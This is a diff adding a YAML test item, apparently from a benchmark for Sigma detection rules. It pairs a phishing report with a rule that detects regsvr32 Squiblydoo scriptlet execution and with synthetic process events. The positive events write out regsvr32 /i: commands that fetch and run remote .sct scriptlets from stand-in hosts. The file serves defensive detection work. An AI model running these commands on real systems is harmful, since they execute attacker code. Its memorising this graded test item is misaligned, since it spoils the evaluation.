@@ -1,0 +1,128 @@
+id: CTL1-03
+role: control
+defect_class: NONE
+evasive: false
+why: 'Correct rule: tags match T1218.010, every value (regsvr32.exe, scrobj.dll, /i:http) is quoted in
+  the evidence, all three selections must hold, and ordinary regsvr32 DLL registration without scrobj.dll
+  and a remote /i: URL does not match.'
+expected_gate: none
+report_text: 'The phishing document launched a scriptlet loader without writing an executable to disk.
+  The activity began minutes after the user opened the attachment. Process telemetry recorded regsvr32.exe
+  /s /n /u /i:http://files.cranemail.test/update.sct scrobj.dll, a technique often called Squiblydoo,
+  which makes the signed regsvr32.exe fetch and run a remote scriptlet. The scrobj.dll library is the
+  scriptlet runtime and there is no reason for it to appear in a regsvr32 command line in this estate.
+  The /i: switch carried an http URL in every observed case. Analysts should alert when regsvr32.exe is
+  started with scrobj.dll and a remote /i:http argument.'
+evidence:
+- regsvr32.exe /s /n /u /i:http://files.cranemail.test/update.sct scrobj.dll
+- Analysts should alert when regsvr32.exe is started with scrobj.dll and a remote /i:http argument.
+logsource: windows_process_creation
+techniques:
+- T1218.010
+sigma_yaml: |
+  title: Regsvr32 Remote Scriptlet Execution via Scrobj
+  id: 8d2e9c30-5f64-4b8d-a113-4e906f1b3c03
+  status: experimental
+  description: 'Detects regsvr32.exe loading scrobj.dll with a remote scriptlet URL passed through the /i: switch.'
+  references:
+    - 'urn:atidep:case'
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.stealth
+    - attack.t1218.010
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection_img:
+      Image|endswith: '\regsvr32.exe'
+    selection_scrobj:
+      CommandLine|contains: 'scrobj.dll'
+    selection_remote:
+      CommandLine|contains: '/i:http'
+    condition: all of selection*
+  falsepositives:
+    - 'Legacy software that registers remote scriptlets, which is not expected in this estate'
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\regsvr32.exe
+    cmd: regsvr32.exe /s /n /u /i:http://files.cranemail.test/update.sct scrobj.dll
+    parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+    parent_cmd: '"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n'
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\SysWOW64\regsvr32.exe
+    cmd: regsvr32 /u /n /s /i:https://cdn.example/x.sct scrobj.dll
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\regsvr32.exe
+    cmd: C:\Windows\System32\regsvr32.exe /s /n /u /i:http://198.51.100.23/a.sct scrobj.dll
+    parent: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    parent_cmd: powershell.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\msiexec.exe
+    cmd: msiexec.exe /i C:\Temp\app.msi /qn
+    parent: C:\Windows\System32\services.exe
+    parent_cmd: services.exe
+    user: NT AUTHORITY\SYSTEM
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\cmd.exe
+    cmd: cmd.exe /c ipconfig /all
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE
+    cmd: OUTLOOK.EXE
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\regsvr32.exe
+    cmd: regsvr32.exe /s "C:\Program Files\Common Files\Vendor\viewer.dll"
+    parent: C:\Windows\System32\msiexec.exe
+    parent_cmd: msiexec.exe /i C:\Temp\app.msi /qn
+    user: NT AUTHORITY\SYSTEM
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\regsvr32.exe
+    cmd: regsvr32.exe /s /u C:\Program Files\OldApp\shell.dll
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
